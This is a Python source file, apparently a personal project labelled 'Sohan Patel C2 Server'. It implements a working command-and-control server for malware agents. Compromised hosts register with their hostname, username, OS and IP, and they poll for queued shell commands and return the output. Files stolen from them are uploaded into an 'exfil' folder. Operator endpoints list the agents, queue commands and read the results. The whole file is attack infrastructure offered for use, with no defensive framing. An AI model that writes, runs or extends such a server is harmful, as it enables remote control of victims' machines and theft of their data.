#Sohan Patel C2 Server

from http.server import BaseHTTPRequestHandler, HTTPServer
import json, os, datetime, threading, sys

PORT      = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
EXFIL_DIR = "exfil"
os.makedirs(EXFIL_DIR, exist_ok=True)

agents   = {}   # agent_id -> info dict
commands = {}   # agent_id -> pending command string
results  = {}   # agent_id -> list of result dicts
lock     = threading.Lock()


def route(path, method):
    patterns = {
        "POST": [
            ("/register",           "handle_register",  []),
            ("/result/<agent_id>",  "handle_result",    ["agent_id"]),
            ("/upload/<agent_id>",  "handle_upload",    ["agent_id"]),
            ("/op/send/<agent_id>", "handle_op_send",   ["agent_id"]),
        ],
        "GET": [
            ("/cmd/<agent_id>",     "handle_get_cmd",   ["agent_id"]),
            ("/op/agents",          "handle_op_agents", []),
            ("/op/results/<agent_id>", "handle_op_results", ["agent_id"]),
        ],
    }
    for pattern, handler, var_names in patterns.get(method, []):
        parts_p = pattern.split("/")
        parts_r = path.split("/")
        if len(parts_p) != len(parts_r):
            continue
        kwargs = {}
        match  = True
        for pp, rp in zip(parts_p, parts_r):
            if pp.startswith("<") and pp.endswith(">"):
                kwargs[pp[1:-1]] = rp
            elif pp != rp:
                match = False
                break
        if match:
            return handler, kwargs
    return None, {}

# ── Request handler ───────────────────────────────────────────────────────────

class Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass   # silence default access log spam

    # ── Helpers ───────────────────────────────────────────────────────────────

    def read_json(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length)
        return json.loads(body) if body else {}

    def send_json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self.end_headers()
        self.wfile.write(body)

    def get_query(self):
        """Parse ?key=value from the path."""
        if "?" not in self.path:
            return {}
        qs = self.path.split("?", 1)[1]
        return dict(pair.split("=", 1) for pair in qs.split("&") if "=" in pair)

    def clean_path(self):
        return self.path.split("?")[0]

    # ── Routing ───────────────────────────────────────────────────────────────

    def do_GET(self):
        handler_name, kwargs = route(self.clean_path(), "GET")
        if handler_name:
            getattr(self, handler_name)(**kwargs)
        else:
            self.send_json({"error": "not found"}, 404)

    def do_POST(self):
        handler_name, kwargs = route(self.clean_path(), "POST")
        if handler_name:
            getattr(self, handler_name)(**kwargs)
        else:
            self.send_json({"error": "not found"}, 404)

    # ── Agent endpoints ───────────────────────────────────────────────────────

    def handle_register(self):
        data = self.read_json()
        aid  = data.get("id")
        with lock:
            agents[aid] = {
                "last_seen": datetime.datetime.now().isoformat(),
                "hostname":  data.get("hostname", "?"),
                "username":  data.get("username", "?"),
                "os":        data.get("os", "?"),
                "ip":        self.client_address[0],
            }
        print(f"[+] New agent: {aid}  host={agents[aid]['hostname']}  user={agents[aid]['username']}")
        self.send_json({"status": "ok"})

    def handle_get_cmd(self, agent_id):
        with lock:
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.datetime.now().isoformat()
            cmd = commands.pop(agent_id, "")
        self.send_json({"cmd": cmd})

    def handle_result(self, agent_id):
        data  = self.read_json()
        entry = {
            "cmd":    data.get("cmd", ""),
            "output": data.get("output", ""),
            "time":   datetime.datetime.now().isoformat(),
        }
        with lock:
            results.setdefault(agent_id, []).append(entry)
        print(f"\n[{agent_id}] $ {entry['cmd']}\n{entry['output']}")
        self.send_json({"status": "ok"})

    def handle_upload(self, agent_id):
        fname  = self.get_query().get("name", "unknown")
        safe   = os.path.basename(fname)
        dest   = os.path.join(EXFIL_DIR, f"{agent_id}_{safe}")
        length = int(self.headers.get("Content-Length", 0))
        data   = self.rfile.read(length)
        with open(dest, "wb") as f:
            f.write(data)
        print(f"[+] File exfilled from {agent_id}: {dest} ({len(data)} bytes)")
        self.send_json({"status": "ok"})

    # ── Operator endpoints ────────────────────────────────────────────────────

    def handle_op_agents(self):
        with lock:
            self.send_json(dict(agents))

    def handle_op_send(self, agent_id):
        data = self.read_json()
        with lock:
            commands[agent_id] = data.get("cmd", "")
        self.send_json({"status": "queued"})

    def handle_op_results(self, agent_id):
        with lock:
            self.send_json(list(results.get(agent_id, [])))


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", PORT), Handler)
    server.socket.settimeout(1)   # lets KeyboardInterrupt work cleanly
    print(f"[*] C2 server (no-dep) listening on 0.0.0.0:{PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
        server.server_close()